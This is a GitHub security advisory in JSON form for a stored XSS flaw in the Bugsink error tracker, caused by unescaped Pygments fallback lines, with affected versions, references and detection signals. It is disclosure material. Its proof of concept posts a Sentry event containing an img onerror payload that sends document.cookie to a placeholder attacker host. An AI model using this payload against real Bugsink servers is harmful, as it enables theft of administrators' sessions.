{
  "id": "GHSA-vp6q-7m36-pq3w",
  "modified": "2026-02-25T16:19:18.568397Z",
  "published": "2026-02-25T16:06:00Z",
  "aliases": [
    "CVE-2026-27614"
  ],
  "summary": "Bugsink is vulnerable to Stored XSS via Pygments fallback in stacktrace rendering",
  "details": "### Summary\n\nAn unauthenticated attacker who can submit events to a Bugsink project can store arbitrary JavaScript in an event.\nThe payload executes only if a user explicitly views the affected Stacktrace in the web UI.\n\n### Details\n\nWhen Pygments returns more lines than it was given (a known upstream quirk that triggers with Ruby heredoc-style input), `_pygmentize_lines()` in `theme/templatetags/issues.py:75-77` falls back to returning the raw input lines. `mark_safe()` at line 111-113 is then applied unconditionally - including to those unsanitized raw lines. Since DSN endpoints are public by Sentry protocol, no account is needed to inject. The payload sits in the database until an admin looks at the event.\n\n```python\n# issues.py:75-77 - fallback path, no escaping\nif len(pygmented) != len(lines):\n    return lines  # raw HTML returned here\n\n# issues.py:111-113 - unconditional mark_safe\nreturn [mark_safe(line) for line in result]\n```\n\n### Operational Signals\n\nExploitation attempts are likely to generate the diagnostic event:\n\n```\n\"Pygments line count mismatch, falling back to unformatted code\"\n```\n\nInstallations that monitor Bugsink with Bugsink (or otherwise alert on internal errors)\nmay see this message as an issue. While the condition can occur benignly, unexpected\noccurrences, especially from unusual languages (specifically ruby), warrant review.\n\n\n### PoC\n\nSend a Sentry event to `/api/\u003cproject-id\u003e/store/` with a valid DSN:\n\n```python\nimport requests\n\npayload = {\n    \"exception\": {\"values\": [{\"stacktrace\": {\"frames\": [{\n        \"filename\": \"app.rb\",\n        \"lineno\": 2,\n        \"pre_context\": [\"\u003c\u003c~HEREDOC\", \"  foo\", \"HEREDOC\"],\n        \"context_line\": \"\u003cimg src=x onerror=fetch('//attacker/?c='+document.cookie)\u003e\",\n        \"post_context\": []\n    }]}}]}\n}\n\nrequests.post(\n    \"http://bugsink-host/api/\u003cproject-id\u003e/store/\",\n    json=payload,\n    headers={\"X-Sentry-Auth\": \"Sentry sentry_key=\u003cdsn-public-key\u003e, sentry_version=7\"}\n)\n```\n\nOpen the event in the bugsink UI as any admin. Cookie exfiltrates immediately.\n\n### Impact\n\nThis is a stored XSS vulnerability.\n\nSuccessful exploitation requires:\n\n* The attacker can submit events to the project (i.e. knows the DSN or can access a client that uses it).\n* The Bugsink ingest endpoint is reachable to the attacker.\n* An administrator explicitly views the crafted event in the UI.\n\nUnder those conditions, the attacker can execute JavaScript in the administrator’s browser\nand act with that user’s privileges within Bugsink.",
  "affected": [
    {
      "package": {
        "ecosystem": "PyPI",
        "name": "bugsink",
        "purl": "pkg:pypi/bugsink"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "2.0.13"
            }
          ]
        }
      ],
      "versions": [
        "0.0.1",
        "0.1.12",
        "0.1.13",
        "0.1.14",
        "0.1.15",
        "0.1.16",
        "0.1.17",
        "0.1.18",
        "0.1.19",
        "0.1.20",
        "1.0.0",
        "1.0.1",
        "1.1.0",
        "1.1.1",
        "1.1.2",
        "1.2.0",
        "1.3.0",
        "1.4.0",
        "1.4.1",
        "1.4.2",
        "1.4.3",
        "1.5.0",
        "1.5.1",
        "1.5.2",
        "1.5.3",
        "1.5.4",
        "1.5.5",
        "1.6.0",
        "1.6.1",
        "1.6.2",
        "1.6.3",
        "1.6.4",
        "1.7.0",
        "1.7.1",
        "1.7.2",
        "1.7.3",
        "1.7.4",
        "1.7.5",
        "1.7.6",
        "2.0.0",
        "2.0.0a1",
        "2.0.1",
        "2.0.10",
        "2.0.11",
        "2.0.12",
        "2.0.2",
        "2.0.3",
        "2.0.4",
        "2.0.5",
        "2.0.6",
        "2.0.7",
        "2.0.8",
        "2.0.9"
      ],
      "database_specific": {
        "last_known_affected_version_range": "\u003c= 2.0.12",
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-vp6q-7m36-pq3w/GHSA-vp6q-7m36-pq3w.json"
      }
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/bugsink/bugsink/security/advisories/GHSA-vp6q-7m36-pq3w"
    },
    {
      "type": "ADVISORY",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-27614"
    },
    {
      "type": "WEB",
      "url": "https://github.com/bugsink/bugsink/commit/e784d6aeb0d5f29b40c2779d2544c2b9ef097ee9"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/bugsink/bugsink"
    },
    {
      "type": "WEB",
      "url": "https://github.com/bugsink/bugsink/releases/tag/2.0.13"
    }
  ]
}